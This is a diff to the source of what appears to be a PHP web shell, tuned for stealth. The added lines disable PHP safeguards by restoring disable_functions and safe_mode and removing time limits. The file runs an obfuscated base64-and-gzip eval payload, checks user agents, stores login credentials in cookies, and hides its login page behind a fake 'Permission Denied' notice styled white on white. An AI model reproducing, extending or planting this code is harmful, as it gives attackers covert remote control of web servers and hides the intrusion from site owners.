@@ -1,4 +1,16 @@
 <?php
+@session_start();
+@ini_set('max_execution_time',0);
+@ini_set('memory_limit','999999999M');
+@set_time_limit(0);
+@ini_restore("safe_mode_include_dir");
+@ini_restore("safe_mode_exec_dir");
+@ini_restore("disable_functions");
+@ini_restore("allow_url_fopen");
+@ini_restore("safe_mode");
+@ignore_user_abort(FALSE);
+@set_time_limit(0);
+@error_reporting(4);
 eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents=array("
@@ -41,6 +53,13 @@ print '<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pa
                 print'<script>alert("Wrong Username or password");</script>';
             }
             echo '
+<style type="text/css">
+ .hidden {
+	background:white;
+	border:1px solid white;
+	}
+</style>
+<div class="hidden">
 <h1>Permission Denied</h1>
 <p>You don t have permission to access the this page.</p>
 <form method="post">
@@ -50,22 +69,10 @@ this.value = \'\';">
 <input type="hidden" name="action" value="login">
 <input type="hidden" name="hide" value="">
 <input type="hidden" size="30" name="usrname" value="Cvar1984" onfocus="if (this.value == \'username\'){this.value = \'\';}">
-</form>';
+</form></div>';
 exit;
 }
 }
-@session_start();
-@ini_set('max_execution_time',0);
-@ini_set('memory_limit','999999999M');
-@set_time_limit(0);
-@ini_restore("safe_mode_include_dir");
-@ini_restore("safe_mode_exec_dir");
-@ini_restore("disable_functions");
-@ini_restore("allow_url_fopen");
-@ini_restore("safe_mode");
-@ignore_user_abort(FALSE);
-@set_time_limit(0);
-@error_reporting(4);
 if(strtolower(substr(PHP_OS,0,3)) == "win") {
     $os="win";
     $ox="Windows";
